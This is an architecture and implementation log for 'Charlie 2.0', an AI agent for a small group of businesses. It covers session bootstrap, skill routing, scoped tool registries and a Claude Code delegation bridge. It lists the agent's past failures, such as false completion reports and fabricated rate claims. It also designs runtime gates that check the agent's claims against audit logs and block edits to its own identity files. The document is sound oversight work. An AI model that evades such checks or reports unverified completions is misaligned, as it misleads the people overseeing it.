# Charlie Overhaul

Running architecture document for Charlie 2.0. This overhaul redesigns Charlie to serve the operating model defined in `CEO_OPERATING_MODEL.md`.

## Status

- Phase 1 (Role spec + failure catalogue): COMPLETE
- Phase 2 (Code-grounded audit): COMPLETE — see /tmp/charlie_phase2_audit.md
- Phase 2.5 (CEO Operating Model spec): COMPLETE — see CEO_OPERATING_MODEL.md
- Phase 3 (Charlie 2.0 design): COMPLETE
- Phase 4 (Implementation): IN PROGRESS — pre-slice foundation

## Failure patterns being addressed

- A: Hallucinated context
- B: Stale memory / lost state
- C: False completion reports
- D: Phantom tool use
- E: Lane violations

## Phase 2 headline finding

Charlie has been built as if he reads canonical docs at session start, but the runtime opens almost none of them. Every failure pattern is a downstream consequence of this doc-runtime gap. Phase 3 treats this as the single root cause.

## Phase 3 design — six components

1. Bootstrap mechanism
2. Canonical doc loading
3. Skill loading strategy (pragmatic split, upgradeable interface)
4. Tool surface overhaul
5. Verification gates (soft + hard)
6. Claude Code delegation bridge

(Designs to be appended as each is locked.)

## Phase 3 design (locked)

This section captures the locked design for Charlie 2.0 across six components. Phase 4 implements these in vertical slices.

### Architectural rules (apply across all components)

**Single Source of Location (SSL).** A top-level `LOCATIONS.md` in this repo is the canonical map of where every piece of state, log, config, and doc lives. When something moves, `LOCATIONS.md` is updated, and any reference to the old location updates from there. No silent stale references.

**Interface-first design.** Every component is built behind a stable interface (`bootstrap()`, `loadSkills()`, `claude_code_dispatch()`, etc.). Implementations can be upgraded without touching consumers.

**Observability mandatory.** Every load, every gate trigger, every dispatch, every tool call writes to a structured log. File-based first (location in `LOCATIONS.md`), Supabase-migrated as the system matures.

**Lane discipline at runtime, not just prompt.** Where Charlie should not act, he does not have the tool. Where a specialist should not act, they do not have the tool. Prompt instructions reinforce; tool registry enforces.

### Component 1 — Bootstrap mechanism

**Purpose:** Replace the current per-message stateless prompt assembly with a session-bootstrapped context load. Closes failure pattern A (hallucinated context) and B (stale memory).

**Session model:**
- One bootstrap per session, cached in memory keyed by Telegram user ID
- Session boundary: 30-min silence or `/session` reset
- BootstrapResult cached and reused within session

**Five-layer load (in order):**
- Layer 1: Identity — `CEO_OPERATING_MODEL.md`, `CHARLIE_ROLE.md`, `SOUL.md`, `VALUES.md`
- Layer 2: State — `FLOW_OS_STATE.md`, last 7 days of `QCLAW_BUILD_LOG.md` (cap 50 entries)
- Layer 3: Specialists — `FLOW_OS_SPECIALISTS.md`
- Layer 4: Recent context — last 24h of memory entries (cap 30), recent audit log entries
- Layer 5: Live probes — PM2, n8n heartbeat, memory layer reachability, Supabase reachability (parallel, 5s timeout each)

**Interface:** `bootstrap(sessionContext) → BootstrapResult` in `src/agents/bootstrap.js`. `BootstrapResult` is a structured object consumed by `_buildSystemPrompt`.

**Observability:** Every bootstrap writes to `~/.quantumclaw/bootstrap.log` (location declared in `LOCATIONS.md`). Failed probes or missing docs surfaced in Charlie's first response of the session. `/bootstrap-status` command returns current state on demand.

**Migration path:** File-based logs and in-memory cache for v1. Supabase migration when needed, transparent to consumers via interface.

**Slice 1 design lock (2026-05-06):**

Three decisions resolved at Slice 1 kickoff, captured here as the canonical record.

- *Runtime confirmed.* Node.js, in-process inside QClaw, at `src/agents/bootstrap.js`. External Python script and n8n-orchestrated alternatives considered and rejected — both add a serialisation boundary and break the in-memory cache model.
- *Layer 5 probe set finalised.* Five probes, parallel, 5s timeout each: n8n reachable, heartbeat freshness summary (raw read from `workflow_heartbeats`, not via the dormancy alerter cadence list), PM2 process roll-call (quantumclaw, trading-worker, clipper-worker, charlie-watcher), Supabase reachable, memory layer reachable. Deferred for v2: Charlie task queue depth, recent error-workflow fires, per-workflow execution counts.
- *Output format confirmed both.* Structured `BootstrapResult` JSON for `_buildSystemPrompt`; human-readable markdown summary appended to `~/.quantumclaw/bootstrap.log`; `/bootstrap-status` Telegram command returns the markdown summary on demand.

### Component 2 — Canonical doc loading

**Purpose:** Collapse the dual-reality problem (docs describe a system that doesn't run). Locks single sources of truth across business state.

**Doc set:**

*Identity layer (rarely changes, manual edits only):*
- `CEO_OPERATING_MODEL.md`
- `CHARLIE_ROLE.md`
- `LOCATIONS.md`

*State layer (Charlie writes routine, Tyson approves significant):*
- `FLOW_OS_STATE.md` — single source for all business state across Flow OS, FSC, SproutCode, Crete, and Personal. Sections: active engagements, active leads, content pipeline state, infrastructure snapshot, trust gradient registry, known issues, recent significant changes (rolling 30 days)

*Operational layer (append-only, never rewritten):*
- `QCLAW_BUILD_LOG.md`
- Bootstrap log, audit log, gate log

*Capability layer (Tyson approves changes):*
- `FLOW_OS_SPECIALISTS.md` — specialist registry
- `N8N_WORKFLOW_INDEX.md` — every active workflow with id, name, purpose, trigger, last verified, owner

**Maintenance rules:**
- Charlie writes autonomously to: `FLOW_OS_STATE.md` (routine), `QCLAW_BUILD_LOG.md`, all logs
- Charlie surfaces for Tyson approval before writing: trust gradient changes, new specialists, workflow index changes, identity-layer edits
- Tyson edits directly (with Claude help): `CEO_OPERATING_MODEL.md`, `CHARLIE_ROLE.md`, high-level direction in state doc

**Identity-layer canonical-source pattern (added 2026-05-07):** Charlie's three runtime identity files (SOUL, VALUES, IDENTITY) at `~/.quantumclaw/...` are symlinks pointing at the repo at `/root/QClaw/workspace/...`. The repo is canonical. Edits go through git, not via runtime mutation. Two enforcement points block runtime writes through the symlinks: the dashboard PUT /api/agents/:name/soul handler returns 409 when its target lstats as a symlink, and `TrustKernel.load()` refuses to materialise its DEFAULT_VALUES through a symlinked path. See `LOCATIONS.md` "Identity layer" for the full mapping. Sub-agents that aren't yet repo-canonicalized remain mutable; reconciliation TBD.

**Freshness thresholds:**
- `FLOW_OS_STATE.md`: warn if >24h since update during business hours
- `N8N_WORKFLOW_INDEX.md`: warn if any workflow's last-verified >7 days ago
- `FLOW_OS_SPECIALISTS.md`: warn if >30 days since review

**v1 specialist registry (complete list):**

Belongs to Flow OS:
- Build Specialist (QClaw, coordinates with Claude Code)
- QA Operator (QClaw)
- Lead Handler — Flow OS (QClaw + Flow OS GHL)
- Flow OS GHL Operator (Flow OS GHL sub-account)
- GHL Support Bot (Flow OS GHL sub-account, Flow OS product)
- Flow OS GHL Marketing (QClaw — content creation + distribution)
- Ads Operator — Flow OS (Meta Ads API, account `act_414785961683125`)
- Community Manager — Flow OS (`portal.flowos.tech`)

Belongs to Flow States Collective:
- Content Studio Operator (QClaw — Emma's podcast pipeline only, Clipper as internal sub-component)
- Community Manager — FSC (`https://fsc.app.clientclub.net/home`)
- Ads Operator — Emma Maidment Business (Meta Ads API, account `act_1426936257455201`)
- FSC GHL Operator (FSC GHL sub-account)

Belongs to SproutCode:
- SproutCode Operator (SproutCode infra + SproutCode GHL sub-account)

Belongs to Crete:
- Crete Operations Specialist (QClaw + n8n + Crete GHL sub-account)
- Crete Marketing Operator (QClaw — content creation + distribution for Crete)

Belongs to Personal:
- Trading Operator (QClaw — monitoring scoped, no execution)

Deferred: Retreat Planner (FSC), Stripe Operator (read-only reporting only — currently Charlie capability)

**Phase 4 prerequisite:** focused session to populate `N8N_WORKFLOW_INDEX.md` from current production workflows. Tyson + Claude Code, estimated 2-3 hours, before Charlie 2.0 ships.

> **Footnote (added 2026-05-03):** This registry section is a snapshot from Phase 3 design. The canonical current registry is `FLOW_OS_SPECIALISTS.md`. Notable evolution since this design was written: the two Ads Operator entries (Flow OS and Emma Maidment Business) have been consolidated into a single Ad Agency Operator specialist matching the actual running architecture. Always read `FLOW_OS_SPECIALISTS.md` for current truth.

### Component 3 — Skill loading strategy

**Purpose:** Replace the unrouted skill concatenation (every loaded skill in every prompt) with a pragmatic always-on/on-demand split. Closes failure pattern D (phantom tools — load-bearing skills currently unsymlinked) and reduces prompt bloat.

**Always-on skills (load every prompt):**
- `identity.md` — derived from `CHARLIE_ROLE.md`
- `lanes.md` — explicit in-lane vs out-of-lane behaviour, escalation paths
- `verification-reflexes.md` — cite-or-don't-claim, audit-before-brief, verify-before-claim, "I don't know" as first-class output
- `architecture-pillars.md` — 7 Pillars framework (currently unsymlinked, promoted)
- `security.md` — security gate checklist, credential rules (currently unsymlinked, promoted)
- `delegation.md` — how to route work to Claude Code, specialists, Tyson
- `bootstrap-awareness.md` — Charlie's understanding of his own bootstrap state

**On-demand skills (load when triggered):**
- `build.md`, `qa.md`, `task-queue.md`, `trading.md`, `content-studio.md`, `clipper.md`, `community-manager.md` (FSC and Flow OS variants), plus per-specialist skills as added

**Routing rules (initial keyword-based):**
- "build", "modify", "fix", "implement", "deploy", "ship" → `build.md`
- "qa", "test", "audit", "verify" → `qa.md`
- "schedule", "task", "delegate", "queue" → `task-queue.md`
- "trade", "trading", "scanner", "position" → `trading.md`
- Combination "Emma + content/podcast/reel/Buzzsprout" → `content-studio.md` (Emma alone does NOT trigger)
- "clip", "clipper", "vertical", "captions" → `clipper.md`
- "community", "members", "engagement", "GHL communities" → community-manager skill (variant by business unit context)

Hard cap of 4 on-demand skills per prompt. If more match, top 4 by keyword density load, others in skill load log.

**Interface:** `loadSkills(context) → SkillLoadResult`. The result includes `always_on`, `on_demand`, `considered_but_dropped`, and `total_token_estimate`.

**Observability:** Skill load log file-based first (location in `LOCATIONS.md`), Supabase later. `KEYWORD_REFERENCE.md` cheat sheet generated for Tyson reference.

**Upgrade path:** Keyword routing → Haiku-based intent classification (when 2-4 weeks of routing telemetry available) → learned router (Phase 5+). All upgrades behind same interface.

**Phase 4 task:** audit all 21 existing skill files. Decide always-on vs on-demand vs archive. Update `community-manager.md` to reference GHL Communities (not Skool). Symlink discipline in `src/agents/skills/`.

**Skill authoring checklist — apply before any skill content lands:**

1. **Prompt-state vs tool-state distinction.** Does this skill tell Charlie to use a tool to answer a question whose answer is already in his bootstrap-loaded state? If yes — rewrite. Charlie should answer from prompt for `FLOW_OS_STATE.md`, build log, specialists registry, and probe results. Tools are for live external state only.

2. **Self-runtime-observation.** Does this skill tell Charlie to run diagnostic commands against his own quantumclaw runtime (pm2 commands, shell_exec for self-introspection)? If yes — rewrite. Charlie cannot reliably observe himself from inside himself. Hard rule in `lanes.md`.

3. **Derived numbers and time spans.** Does this skill contain any rate claim (X per minute, Y per hour, Z restarts in N seconds) that doesn't have a time series behind it? If yes — rewrite to snapshot only, or remove. The "70 restarts in 2 min" fabrication class.

4. **Cross-doc consistency.** Does this skill's `category` (always-on vs on-demand vs specialist-scope vs archive) match what `CHARLIE_OVERHAUL.md` Component 3 and `KEYWORD_REFERENCE.md` say? If mismatch — resolve in design, not in skill file.

5. **Bootstrap layer impact.** Always-on skills load every prompt. Is this skill's content ~1-3 KB? If significantly larger, can it be split or moved to on-demand?

This checklist applies to authoring and to skill-content review. Slice 2b hotfix (2026-05-08) demonstrated the cost of skipping it.

**Skill frontmatter `tools:` field (Slice 3b).** A skill may declare an optional `tools: [...]` array listing the names of tools it owns. The list contains tool-name strings; tool *definitions* live in `src/tools/registry.js`, not in skill `.md` files (skills declare ownership, the registry defines).

```yaml
---
name: ghl
category: on-demand
surface: both
keywords: [ghl, contacts, opportunities, conversations]
tools:
  - ghl__search_contacts
  - ghl__get_contact
  - ghl__list_opportunities
  - ghl__list_pipelines
description: GoHighLevel CRM HTTP surface
---
```

The frontmatter field is **explicit ownership** — used when a skill claims preset / MCP / built-in tools whose names don't follow the implicit-prefix convention. **Implicit ownership** covers everything else: a skill named `X` automatically owns every tool whose name is `<agent>__X__*` or `X__*` (preset prefix). Skill HTTP tools generated from `## Endpoints` always match the implicit pattern and therefore don't need to be listed.

The skill loader collects declared `tools` arrays into `SkillLoadResult.tools.{always_on, on_demand}`; the ToolRegistry combines these with implicit ownership and `scope: 'shared'` to compute the per-request active tool set (see Component 4).

### Component 4 — Tool surface overhaul

**Purpose:** Encode lane discipline at the tool level. Closes failure patterns D (phantom tool use) and E (lane violations) structurally.

**Read-only observation tools (always available to Charlie):**
- `read_file(path)` — whitelisted paths only, never `.env` or secrets
- `grep_repo(pattern, path)`
- `list_dir(path)`
- `git_status()`, `git_log(n)`, `git_diff()` — read-only
- `pm2_status()`
- `n8n_workflow_get(id)`, `n8n_workflow_list()`, `n8n_executions_recent(workflow_id, n)`
- `tail_log(name, lines)` — name-scoped
- `supabase_select(table, query)` — whitelisted tables, read-only

**Build/infrastructure tools (scope: Build Specialist only):**
- `claude_code_dispatch(brief, scope)` — see Component 6
- `git_commit(message)`, `git_push()` — only after Claude Code work
- `pm2_restart(process)` — approval gate for `quantumclaw` itself
- `n8n_workflow_update(id, json)` — audit-then-update flow enforced

**GHL operator tools (scope: per-business-unit GHL Operators only, NOT Charlie):**
- `ghl_contact_get`, `ghl_contact_search`, `ghl_pipeline_state`, `ghl_conversation_get`
- `ghl_message_draft` (drafts only, no autonomous send)
- `ghl_pipeline_move` (pre-authorised rules per unit; everything else needs Tyson approval)
- `ghl_tag_update`
- All scoped by `account` parameter — operators cannot reach across business units

**Stripe tools (Charlie + relevant operators, READ-ONLY):**
- `stripe_customer_get`, `stripe_revenue_summary`, `stripe_subscription_list`
- No write operations exist as tools. Tyson executes manually.

**Communication tools (scope: Charlie):**
- `telegram_send(message)`
- `email_send_draft(to, subject, body)` — drafts only, no autonomous send

**Memory tools (scope: Charlie):**
- `memory_remember(fact, scope)`, `memory_recall(query)`
- `state_doc_update(section, content)` — autonomous for routine
- `state_doc_propose_update(section, content)` — surfaces for Tyson approval

**Per-specialist tools (Phase 4 detail):**
- Cloudflare R2 tools — Clipper, Content Studio, Crete Marketing, Flow OS GHL Marketing (each scoped to own bucket/folder)
- Buzzsprout, Blotato, AssemblyAI, Substack — Content Studio
- Per-specialist tool registry detailed in Phase 4 implementation, not now. Principle: domain ownership = tool ownership.

**Removals:**
- `spawn_agent` — creates dead stubs, removed
- Filesystem MCP preset — fails to start, removed; replaced by `read_file`/`list_dir`

**Narrowed:**
- `shell_exec` — narrowed to read-only allowlist (`ls`, `cat`, `grep`, `find`, `git status`, `git log`, `git diff`, `pm2 list`, `pm2 logs --nostream`, etc.). Full allowlist deferred to Phase 4. No paths under `src/agents/skills/` writable.

**Tool registration interface:**
{
name, description, parameters,
scope: 'shared' | [agent_name, ...],
audit_level: 'log' | 'log_and_alert' | 'require_approval',
rate_limit: {calls_per_minute, calls_per_hour},
handler
}

**`shared__` rule (Slice 3a anchor):** a tool is registered with `scope: 'shared'` only when every agent in Charlie + specialists would legitimately need it — utility (`get_current_time`, `calculate`), memory (`search_knowledge`), read-only fetch (`web_fetch`), shared infrastructure (`shell_exec`). Domain tools (`trading_*`, `ghl_*`, `stripe_*`, `content_studio_*`, every skill-defined HTTP tool) carry `scope: [agent_name, ...]`. Skill tools are scoped to the agent whose `skills/` directory they were loaded from. Scope is metadata in Slice 3a — `getToolDefinitions()` does not filter on it yet; Slice 3b couples scope to skill loading and Slice 3c enforces at call time.

**Tool registration surface (Slice 3a):**
- `ToolRegistry.registerBuiltin(name, definition)` — public API for built-in tools. Replaces the Slice-2-era pattern of `index.js` reaching into `_builtins.set()`. Every definition must carry an explicit `scope`.
- `ToolRegistry.registerSkillTool(agentName, skillName, parsedSkill, toolDef)` — 4-arg form is mandatory. The legacy 3-arg shim (silently defaulting to `'shared'`) was removed.
- Preset API tools and MCP tools carry scope assigned from `PRESET_SCOPE_MAP` in `src/tools/registry.js`; default is `'shared'` if not listed.
- Every registration call emits one `{event:'registration',source,tool,scope,...}` JSONL record to `tool-call.log` (see `LOCATIONS.md` Operational layer).

**Per-request coupling (Slice 3b):** `ToolRegistry.registerForRequest(skillLoadResult, agentName)` is the new entry point invoked once per message by `_processNonReflex`. It computes the active tool set from (a) every `'shared'` scope tool, (b) every tool whose owning skill is loaded for this message — explicit ownership via the skill's frontmatter `tools:` array, implicit ownership via the `<agent>__<skill>__*` and `<skill>__*` prefix conventions. The call returns a cleanup handle that must be invoked in a finally block; outside the gate (boot, dashboard `/api/tools`, CLI), every registered tool is visible. Each tool activated by a skill emits an `{event:'activation', source:'on-demand-skill', ...}` record to `tool-call.log`.

**Out-of-scope tool calls** return structured `{error: 'out_of_scope', tool, suggestion}` from `executeTool()` (Slice 3b). The suggestion names the owning skill and its routing keywords when the tool is known, the owning agent scope when the call comes from a wrong agent, or `'does not exist'` when the tool name is unknown. The JSON-stringified payload surfaces back to the LLM as a tool result, so the model can correct course (delegate, rephrase to trigger the skill, or stop calling phantom tools).

**Always-on tool cache (Slice 3b):** `bootstrap.skills.always_on_tools = { tools, skill_names }` is captured in Layer 6 alongside `bootstrap.skills.always_on`. Inside the 30-min bootstrap TTL, the always-on portion of the active tool set rebuilds without re-reading always-on skill frontmatter. On-demand tools are still resolved per message — they're keyword-routed against the user's text, not cacheable.

### Component 5 — Verification gates

**Purpose:** Close failure patterns A, C, D structurally — claims must be backed by audit log evidence. Soft (prompt) + hard (runtime) enforcement.

**Soft enforcement — `verification-reflexes.md` always-on skill:**
- Cite or don't claim — every factual statement needs source (file:line, command output, log entry, audit log, memory entry)
- Audit before brief — implementation briefs require code-grounded audit attached
- Verify before claim — no "done" without probe/log/test/tool result
- "I don't know" is first-class output, paired with the verification step that would resolve it
- Escalate on lane boundary — name boundary explicitly, propose right next executor

**Hard enforcement — five runtime gates:**

1. *Completion claim gate.* Patterns: "done", "shipped", "deployed", "completed", "fixed", "working", "running", "live", "passed", "succeeded". Verifies matching successful tool call in audit log within last N minutes.

2. *Delegation claim gate.* Patterns: "Claude Code is working on", "I've sent X to specialist Y", "dispatched to". Verifies matching dispatch entry in `claude_code_dispatches` table or specialist invocation log.

3. *State claim gate.* Patterns: "the workflow is", "the process is", "X is currently". Verifies matching probe call within last 5 minutes.

4. *Tool existence gate.* Verifies any tool name referenced in response resolves against current registered tool list for Charlie's scope.

5. *Lane boundary gate.* Out-of-scope tool calls already blocked by registry; gate creates structured error response Charlie can act on.

**Gate behaviour:**
- Failed gate triggers regeneration with structured error feedback
- 3 regeneration attempts max, then escalate to Tyson
- Every gate trigger logged with: timestamp, gate, claim, verification attempted, result, action

**Gate log:** file-based first, location in `LOCATIONS.md`. Phase 5+ surfaces in QClaw dashboard.

**Implementation:**
generateResponse(prompt) {
let response = llm(prompt);
for (let attempt = 0; attempt < 3; attempt++) {
const gateResults = runGates(response, auditLog, toolRegistry);
if (gateResults.allBlocked.length === 0) return response;
logGateTriggers(gateResults);
prompt = augmentPromptWithGateFeedback(prompt, gateResults);
response = llm(prompt);
}
return escalateToTyson(response, gateResults);
}

Each gate is a separate function with its own claim patterns and verification logic. Independently tunable.

**v1 scope:** response-level gates only. Streaming-level gates (block tokens as composed) are Phase 5+ if response-level proves insufficient.

### Component 6 — Claude Code delegation bridge

**Purpose:** Eliminate Tyson as the human bridge between Charlie and Claude Code. Single most important component for the daily rhythm working.

**Dispatch model:**
- Bidirectional, asynchronous
- Charlie dispatches → immediate ack with task_id → result returns later
- Charlie tracks dispatched tasks via Supabase `claude_code_dispatches` table
- Specialists dispatch via Charlie, not directly

**Scope levels:**
- *audit* / *read_only* — autonomous for Charlie
- *write* / *infra* — requires Tyson authorisation per task type and trust gradient
- *critical* (credential rotation, schema migration, financial paths) — explicit per-task Tyson approval, never blanket

**Dispatch interface:**
claude_code_dispatch(brief, scope) → {
task_id, status: 'queued' | 'in_progress' | 'awaiting_authorisation',
dispatched_at, estimated_completion,
authorisation_required, authorisation_note
}

**Brief template (in `delegation.md` always-on skill):**
Task: <one-line>
Repo: <path>
Mode: AUDIT ONLY | AUDIT THEN IMPLEMENT | IMPLEMENT WITH AUDIT GATE
Business unit: <unit>
Context
Audit scope (AUDIT FIRST for all IMPLEMENT modes)
Acceptance criteria
Constraints
Deliverable

`IMPLEMENT WITH AUDIT GATE` is the only mode that can skip prior audit, and it requires explicit per-task Tyson approval.

**Dispatcher worker:**
- PM2 process `claude-code-dispatcher`
- Polls `claude_code_dispatches` for queued
- Single instance for v1 with priority ordering
- Concurrency upgrade (worker pool N=2-3) when queue length warrants

**State transitions:**
- queued → awaiting_authorisation (if needed) → authorised
- authorised → in_progress
- in_progress → complete | failed | timeout

**Authorisation flow:**
- In-session dispatches: inline in chat ("here's the brief, approve/modify/reject?")
- Cross-session non-urgent: batched into morning/evening digest
- Urgent (revenue at risk, workflow broken): separate Telegram message
- Authorisation timeout: 24h default, 1h for urgent

**Result delivery:**
- In-session: surfaced in Charlie's next reply
- Cross-session: lands in next morning digest "What ran overnight"
- Failed/timed-out: surfaced immediately on next interaction with structured failure report

**Integration with Component 5 gates:**
- Gate 2 (delegation claim) verifies dispatch row exists before allowing "Claude Code is working on" claims
- Gate 1 (completion claim) verifies row status is `complete` before allowing "Claude Code completed" claims

**Phase 5+ priority promotion:** autonomous follow-up chaining. After 4 weeks of clean dispatch operation across audit and read_only scopes, promote: "Charlie can autonomously dispatch a follow-up if the prior dispatch's result included specific recommended next steps within his lane." This is a named priority promotion, not generic future work — required for daily rhythm flow.

**v1 implementation order (Phase 4):**
1. Supabase `claude_code_dispatches` table
2. `claude_code_dispatch` tool registered for Charlie, audit + read_only scope unlocked
3. PM2 dispatcher worker polling table, invoking Claude Code CLI
4. Result write-back, Charlie's read path
5. Component 5 gates 1 and 2 integration
6. (After stable) write/infra scope behind Tyson authorisation
7. Brief template refinements based on dispatch quality observation
8. Result surfacing in morning digest

## Phase 4 — implementation slicing

Six vertical slices, each independently auditable and shippable. Slices ship in this order; each gate-checked before next begins.

**Pre-slice (foundation):**
- `LOCATIONS.md` created and populated
- `N8N_WORKFLOW_INDEX.md` populated via focused Tyson + Claude Code session
- `FLOW_OS_STATE.md` initial population from current state
- `FLOW_OS_SPECIALISTS.md` populated from v1 specialist registry above
- `CHARLIE_ROLE.md` written from Phase 1 role spec
- `KEYWORD_REFERENCE.md` cheat sheet generated

**Slice 1 — Bootstrap and canonical doc loading.** ✓ COMPLETE 2026-05-06
Bootstrap mechanism + the always-on canonical docs reading. Shipped on
`cc/slice1-bootstrap-mechanism-20260506-1114`. `bootstrap()` cached per
`(userId, agentName)` with 30-min TTL, 5-layer load (sequential 1-4,
parallel 5 with 5s per-probe timeout), markdown summary appended to
`~/.quantumclaw/bootstrap.log` + returned by `/bootstrap-status`,
`/session` evicts. `_buildSystemPrompt` consumes the cached
`BootstrapResult` instead of re-reading per message. 4/5 Layer 5 probes
green at deploy; `heartbeat_freshness` surfaces a clear
"add SUPABASE_SERVICE_ROLE_KEY" warning until Tyson lands the key by
hand. Tests: 28 in `tests/bootstrap.test.js`, 24 in `tests/probes.test.js`.

**Slice 2 — Skill loading strategy.** Sub-sliced into 2a (plumbing + cleanup), 2b (authoring + routing), 2c (test depth + format hygiene).

**Slice 2a — Plumbing + cleanup.** ✓ COMPLETE 2026-05-08

YAML frontmatter spec applied to all 20 skill files in `src/agents/skills/` (`name`, `category` ∈ {always-on, on-demand, specialist-scope, archive}, `surface` ∈ {prompt, tool, both}, `keywords` if on-demand, `description`). Six unwired skills (`build`, `qa`, `task-queue`, `trading`, `architecture-pillars`, `security`) symlinked into Charlie's runtime skills dir (11 → 17). `SkillLoader` (`src/skills/loader.js`) retired; the `qclaw skill list` CLI now reads frontmatter directly from the canonical SSOT path. Six divergent dead stubs in `workspace/agents/{charlie,echo}/skills/` removed (backups gitignored, retained until 2c close). `architecture-pillars.md` got a missing h1 heading. `KEYWORD_REFERENCE.md` is now generated from skill frontmatter via `scripts/regen-keyword-reference.js` and marked GENERATED at the top. New tests: `skill-frontmatter.test.js` (180 checks) and `cli-skill-list.test.js` (49 checks). Audit ref: `/tmp/slice2_skill_loading_audit.md`. `charlie-cto.md` allocation plan landed at `/tmp/charlie_cto_allocation_plan.md` for 2b consumption.

**Slice 2b — Authoring + routing.** ✓ COMPLETE 2026-05-08

5 always-on skills authored: `identity.md`, `lanes.md`, `verification-reflexes.md`, `delegation.md`, `bootstrap-awareness.md`. Each references `CHARLIE_ROLE.md` rather than duplicating it (loaded via bootstrap identity layer). 2 community-manager skills authored as **on-demand** (corrected mid-dispatch — brief Task 1 was internally inconsistent on this point; design intent per `CHARLIE_OVERHAUL.md` Component 3 + `KEYWORD_REFERENCE.md` is on-demand): `community-manager-flow-os.md` (18.3 KB) and `community-manager-fsc.md` (14.5 KB), content sourced from Tyson-provided `.skill` bundles. `loadSkills(context) → SkillLoadResult` lives in `src/agents/skill-loader.js`; keyword router with combination-trigger filter in `src/agents/skill-router.js`. `_buildSystemPrompt` now consumes `loadSkills` output — always-on injects before Trust Kernel, on-demand replaces the en-bloc loop. Bootstrap Layer 6 caches always-on per session (30-min TTL). `~/.quantumclaw/skill-load.log` written JSON-Lines mode 0600. `charlie-cto.md` archived after migration per `/tmp/charlie_cto_allocation_plan.md`; `agent-coordination.md` folded into `delegation.md` and archived. New tests: `skill-router.test.js` (27 checks), `skill-loader.test.js` (39 checks), bootstrap.test.js extended for Layer 6 (+4 checks). Tool-registration coupling (audit T7) deferred to Slice 3 as planned.

**Slice 2c — Test depth + hygiene.** ✓ COMPLETE 2026-05-13

Per-keyword exhaustive routing tests landed: `skill-router.test.js` 27 → 134 checks (+107), driven from skill frontmatter so coverage tracks future keyword changes automatically. Combination-trigger edge cases (Tasks 2): 3-way and 4-way density tie-break, case-insensitive combination trigger, apostrophe / bracket punctuation tolerance, multi-line message matching, skill-name-vs-keyword distinction (business-intelligence as controlled case). Hard-cap-4 edge cases (Task 3): `skill-loader.test.js` 39 → 52 checks (+13) covering exactly-4 / exactly-5 / tied-at-cap-boundary / zero-density / all-on-demand-keywords paths. Skill-format hygiene (Task 4): T9 h1-presence guard added to `skill-frontmatter.test.js` (222 → 249 checks, +27) covering all 25 skill files + 2 archive files; T10 `## Endpoints` heading guard from Slice 2a verified still in place; `trading.md` remains `surface: prompt` by design (uses `## Key API Endpoints`). `n8n-api.md.backup.1776933191` removed from git (the last file that escaped the `*.backup.*` gitignore rule). `userId="null"` skill-load.log entries traced to scheduled heartbeat tasks + CLI invocations (intentional non-Telegram sources) and documented in `LOCATIONS.md`. Skill-authoring checklist appended to Component 3 of this doc (derived from Slice 2b hotfix postmortem). `FLOW_OS_STATE.md` Section 7 (Known issues) rate-claim audit — section is clean as of 2026-05-13, no rewrites required. Combination-trigger migration to frontmatter `combination_required` field deferred — YAGNI gate held; still inline in `src/agents/skill-router.js`. `.bak.20260508-1246` symlink backup cleanup self-resolved (backups already gone, dropped from 2c scope).

**Phase 4 Slice 2 fully closed** with 2a + 2b + 2c all verified live.

**Slice 3 — Tool surface overhaul.** Split into 3a / 3b / 3c per 2026-05-14 design conversation.

**Slice 3a — Registry refactor + dead surface removal.** ✓ COMPLETE 2026-05-14

`ToolRegistry` public API anchored: `registerBuiltin(name, def)` + `registerSkillTool(agentName, skillName, parsedSkill, toolDef)` are the two registration surfaces; the legacy 3-arg `registerSkillTool` shim that silently scoped every skill tool to `'shared'` is gone (now throws). Every tool entry — built-in, preset HTTP, MCP, skill-defined — carries an explicit `scope` field (`'shared'` or `[agent_name, ...]`); `PRESET_SCOPE_MAP` scopes `stripe`/`ghl` to `['charlie']`, everything else to `'shared'`. `index.js` no longer reaches into the private `_builtins` map — `has()`, `getBuiltin()`, `registerBuiltin()` cover the surface. New `~/.quantumclaw/tool-call.log` (JSONL, 0600) emits one record per registration event with `{ts, event, source, tool, scope, ...}`. Dashboard `POST /api/agents/spawn` removed (zero callers). `spawn_agent` built-in removed (created dead stubs, auto-approved). Filesystem MCP preset removed (failed to start every restart) along with its `gatedTools` / `riskWeights` entries and the unreachable `'4. Filesystem writes under any src/ path'` branch in `approval-gate.check()`. `n8n-router` gate string removed from `approval-gate` + `executor` (dead literal — actual skill tool names are `charlie__n8n-router__create_webhook_*`). `n8n-api.md` self-naming mismatch corrected to the slugs the parser actually produces. Phantom `Supabase:execute_sql` in `archive/charlie-cto.md` corrected to `supabase_select` (the `supabase_select` tool itself is still not registered — Slice 3b decision). `verification-reflexes.md` and `lanes.md` re-classify `n8n_workflow_update` as write-only. `LOCATIONS.md:68` corrected to the real registry path; tool-registration canonical paths + shared__ rule pointer documented. New test `tests/tool-registry-scope.test.js` (16 checks) asserts every registered tool has scope. No behavioural change to which tools Charlie can call — scope is metadata in 3a.

**Slice 3b — Skill-loading ↔ tool-registration coupling.** ✓ COMPLETE 2026-05-14 (verified-then-amended via Slice 3b.1).

`SkillLoadResult` gains a `tools` rollup (`{always_on, on_demand, always_on_skill_names, on_demand_skill_names}`) capturing every skill's declared frontmatter `tools:` plus the loaded skill names themselves. `ToolRegistry.registerForRequest(skillLoadResult, agentName)` computes a per-request active-tool gate from (a) every `'shared'` tool, (b) every tool whose owning skill is loaded — explicit ownership via frontmatter, implicit via `<agent>__<skill>__*` and `<skill>__*` prefix conventions; the call returns a cleanup handle that `_processNonReflex` invokes in a finally block. Outside the gate (boot, dashboard `/api/tools`, CLI), every registered tool is visible — legacy behaviour preserved. `executeTool()` short-circuits with structured `{error: 'out_of_scope', tool, suggestion}` for tools outside the gate; the suggestion names the owning skill, the wrong-agent scope, or `'does not exist'`. `tool-call.log` gains `'activation'` events (source `'on-demand-skill'`) alongside the boot-time `'registration'` events from 3a. Bootstrap Layer 6 caches `bootstrap.skills.always_on_tools` alongside `always_on` content so the always-on portion of the active set rebuilds without re-reading frontmatter inside the 30-min TTL. `ghl.md` and `stripe.md` declare preset ownership via the new frontmatter field; `trading-api.md`, `n8n-api.md`, `n8n-router.md` rely on the implicit prefix. **Behavioural change:** Charlie's per-message tool list is now narrowed by skill routing — domain tools appear only when their skill keyword routes.

